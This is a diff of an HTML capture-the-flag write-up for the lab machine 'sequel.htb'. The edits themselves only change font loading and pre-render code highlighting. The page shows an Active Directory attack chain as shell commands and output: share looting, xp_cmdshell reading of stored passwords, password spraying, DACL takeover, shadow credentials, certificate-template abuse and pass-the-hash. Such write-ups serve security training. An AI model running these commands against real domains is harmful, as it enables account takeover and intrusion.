@@ -14,7 +14,8 @@
 <link rel="icon" href="/assets/img/blackarch.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;500;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cantarell:wght@400;700&family=Fira+Code:wght@400;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap"></noscript>
 <link rel="stylesheet" href="/assets/css/os.css">
 <link rel="stylesheet" href="/assets/css/article.css">
 <link rel="stylesheet" href="/assets/css/blocks.css">
@@ -23,7 +24,12 @@
   var d = document.documentElement;
   d.className = d.className.replace('nojs', 'js');
   try {
-    if (localStorage.getItem('rc-body') === 'sans') d.setAttribute('data-body', 'sans');
+    if (localStorage.getItem('rc-body') === 'sans') {
+      d.setAttribute('data-body', 'sans');
+      var f = document.createElement('link'); f.id = 'font-sans'; f.rel = 'stylesheet';
+      f.href = 'https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap';
+      document.head.appendChild(f);
+    }
     var root = location.pathname === '/' || location.pathname === '/index.html';
     if (root && !sessionStorage.getItem('rc-booted') && !matchMedia('(prefers-reduced-motion: reduce)').matches) {
       d.classList.add('booting');
@@ -84,7 +90,7 @@
 <div class="wp-stage-body"><p><code>rose / [REDACTED]</code> are the provided credentials. Nmap confirms a full AD stack: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
+<pre class="wp-term-body"><code class="hljs language-bash">$ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
 53/tcp    open  domain
 88/tcp    open  kerberos-sec
 389/tcp   open  ldap     Microsoft AD LDAP (Domain: sequel.htb)
@@ -97,7 +103,7 @@
 <p>Enumerate domain users with netexec + the provided creds:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ netexec ldap 10.10.11.51 -u rose -p &#39;[REDACTED]&#39; --users
+<pre class="wp-term-body"><code class="hljs language-bash">$ netexec ldap 10.10.11.51 -u rose -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> --<span class="hljs-built_in">users</span>
 LDAP  [+] sequel.htb\rose:[REDACTED]
 LDAP  Administrator  Guest  krbtgt  michael  ryan  oscar  sql_svc  rose  ca_svc</code></pre>
 </div>
@@ -115,10 +121,10 @@ LDAP  Administrator  Guest  krbtgt  michael  ryan  oscar  sql_svc  rose  ca_svc<
 <div class="wp-stage-body"><p><code>smbclient -L</code> lists an <code>Accounting Department</code> share readable by rose. Two spreadsheets: <code>accounting_2024.xlsx</code> and <code>accounts.xlsx</code>. Both open corrupted in Excel — but <code>.xlsx</code> is just a zip of XML.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ smbclient &quot;//10.10.11.51/Accounting Department&quot; -U rose
+<pre class="wp-term-body"><code class="hljs language-bash">$ smbclient <span class="hljs-string">&quot;//10.10.11.51/Accounting Department&quot;</span> -U rose
 smb: \&gt; get accounts.xlsx
 $ unzip accounts.xlsx -d accounts/
-$ cat accounts/xl/sharedStrings.xml
+$ <span class="hljs-built_in">cat</span> accounts/xl/sharedStrings.xml
 &lt;t&gt;oscar@sequel.htb&lt;/t&gt;
 &lt;t&gt;kevin@sequel.htb&lt;/t&gt;
 &lt;t&gt;NULL&lt;/t&gt;
@@ -139,13 +145,13 @@ $ cat accounts/xl/sharedStrings.xml
 <h2 class="wp-stage-title"><code>xp_cmdshell</code> + config leak = <code>sql_svc</code> password.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · sa · mssqlclient</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ impacket-mssqlclient &#39;sa:[REDACTED]@10.10.11.51&#39;
-SQL (sa  dbo@master)&gt; EXEC xp_cmdshell &#39;type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI&#39;
+<pre class="wp-term-body"><code class="hljs language-bash">$ impacket-mssqlclient <span class="hljs-string">&#x27;sa:[REDACTED]@10.10.11.51&#x27;</span>
+SQL (sa  dbo@master)&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI&#x27;</span>
 [OPTIONS]
 ...
-SQLSVCACCOUNT=&quot;SEQUEL\sql_svc&quot;
-SQLSVCPASSWORD=&quot;[REDACTED]&quot;      ← old sql_svc password
-SAPWD=&quot;[REDACTED]&quot;</code></pre>
+SQLSVCACCOUNT=<span class="hljs-string">&quot;SEQUEL\sql_svc&quot;</span>
+SQLSVCPASSWORD=<span class="hljs-string">&quot;[REDACTED]&quot;</span>      ← old sql_svc password
+SAPWD=<span class="hljs-string">&quot;[REDACTED]&quot;</span></code></pre>
 </div>
 
 
@@ -164,13 +170,13 @@ SAPWD=&quot;[REDACTED]&quot;</code></pre>
 <h2 class="wp-stage-title">Spray it across the whole user list → <code>ryan</code>.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ nxc smb 10.10.11.51 -u ./users.txt -p ./pass.txt
+<pre class="wp-term-body"><code class="hljs language-bash">$ nxc smb 10.10.11.51 -u ./users.txt -p ./pass.txt
 SMB  sequel.htb\ryan:[REDACTED]       [+]
-$ nxc winrm 10.10.11.51 -u ryan -p &#39;[REDACTED]&#39;
+$ nxc winrm 10.10.11.51 -u ryan -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
 WINRM 5985 DC01 [+] sequel.htb\ryan:[REDACTED] (Pwn3d!)
 
-$ evil-winrm -i 10.10.11.51 -u ryan -p &#39;[REDACTED]&#39;
-*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; type user.txt</code></pre>
+$ evil-winrm -i 10.10.11.51 -u ryan -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
+*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; <span class="hljs-built_in">type</span> user.txt</code></pre>
 </div>
 
 
@@ -191,12 +197,12 @@ $ evil-winrm -i 10.10.11.51 -u ryan -p &#39;[REDACTED]&#39;
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · bloodyAD + dacledit</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ bloodyAD -u ryan -p &#39;[REDACTED]&#39; -d sequel.htb \
-    --host dc01.sequel.htb set owner ca_svc ryan
+<pre class="wp-term-body"><code class="hljs language-bash">$ bloodyAD -u ryan -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> -d sequel.htb \
+    --host dc01.sequel.htb <span class="hljs-built_in">set</span> owner ca_svc ryan
 [+] Old owner S-1-5-21-... is now replaced by ryan on ca_svc
 
 $ dacledit.py -action write -rights FullControl \
-    -principal ryan -target ca_svc sequel.htb/ryan:&#39;[REDACTED]&#39;
+    -principal ryan -target ca_svc sequel.htb/ryan:<span class="hljs-string">&#x27;[REDACTED]&#x27;</span>
 [*] DACL backed up to dacledit-...bak
 [*] DACL modified successfully!</code></pre>
 </div>
@@ -205,24 +211,24 @@ $ dacledit.py -action write -rights FullControl \
 <p>Shadow-credential the <code>ca_svc</code> account to get its NT hash:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · certipy</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ certipy-ad shadow auto -u &#39;ryan@sequel.htb&#39; -p &#39;[REDACTED]&#39; -account ca_svc
-[*] Generating certificate ... Adding Key Credential ... Authenticating as &#39;ca_svc&#39;
-[*] NT hash for &#39;ca_svc&#39;: [REDACTED]</code></pre>
+<pre class="wp-term-body"><code class="hljs language-bash">$ certipy-ad shadow auto -u <span class="hljs-string">&#x27;ryan@sequel.htb&#x27;</span> -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> -account ca_svc
+[*] Generating certificate ... Adding Key Credential ... Authenticating as <span class="hljs-string">&#x27;ca_svc&#x27;</span>
+[*] NT <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;ca_svc&#x27;</span>: [REDACTED]</code></pre>
 </div>
 
 
 <p>Enumerate the 34 templates — <code>DunderMifflinAuthentication</code> is the deliberately-weakened one. Grab a ticket for <code>ca_svc</code>, forge a certificate for <span class="hl-red"><a href="mailto:administrator@sequel.htb">administrator@sequel.htb</a></span>:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · certipy</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k \
+<pre class="wp-term-body"><code class="hljs language-bash">$ KRB5CCNAME=<span class="hljs-variable">$PWD</span>/ca_svc.ccache certipy-ad template -k \
     -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
-[*] Successfully updated &#39;DunderMifflinAuthentication&#39;
+[*] Successfully updated <span class="hljs-string">&#x27;DunderMifflinAuthentication&#x27;</span>
 
-$ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] \
+$ certipy-ad req -u ca_svc -hashes :[ca_svc NT <span class="hljs-built_in">hash</span>] \
     -ca sequel-DC01-CA -template DunderMifflinAuthentication \
     -target DC01.sequel.htb -dns 10.10.11.51 \
     -upn administrator@sequel.htb
-[*] Saved certificate and private key to &#39;administrator_10.pfx&#39;</code></pre>
+[*] Saved certificate and private key to <span class="hljs-string">&#x27;administrator_10.pfx&#x27;</span></code></pre>
 </div></div>
 </section>
 
@@ -234,9 +240,9 @@ $ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] \
 <h2 class="wp-stage-title"><code>certipy auth</code> → NT hash → PTH → flag.</h2>
 <div class="wp-stage-body"><div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · certipy</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
+<pre class="wp-term-body"><code class="hljs language-bash">$ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
 [*] Using principal: administrator@sequel.htb
-[*] Got hash for &#39;administrator@sequel.htb&#39;: aad3b435b51404eeaad3b435b51404ee:[NT HASH]</code></pre>
+[*] Got <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:[NT HASH]</code></pre>
 </div>
 
 
@@ -247,8 +253,8 @@ $ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] \
 
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · PTH</span></div>
-<pre class="wp-term-body"><code class="language-bash">$ evil-winrm -i 10.10.11.51 -u administrator -H [NT HASH]
-*Evil-WinRM* PS&gt; type ..\Desktop\root.txt</code></pre>
+<pre class="wp-term-body"><code class="hljs language-bash">$ evil-winrm -i 10.10.11.51 -u administrator -H [NT HASH]
+*Evil-WinRM* PS&gt; <span class="hljs-built_in">type</span> ..\Desktop\root.txt</code></pre>
 </div>
 
 
@@ -281,9 +287,6 @@ $ certipy-ad req -u ca_svc -hashes :[ca_svc NT hash] \
   </section>
 </main>
 <footer class="nojs-foot">© 2026 Will DeDominico · <a href="https://github.com/Moriz82">GitHub</a> · <a href="https://www.linkedin.com/in/wdedo/">LinkedIn</a></footer>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js" defer></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/swift.min.js" defer></script>
 <script type="module" src="/assets/js/os/main.js"></script>
 </body>
 </html>
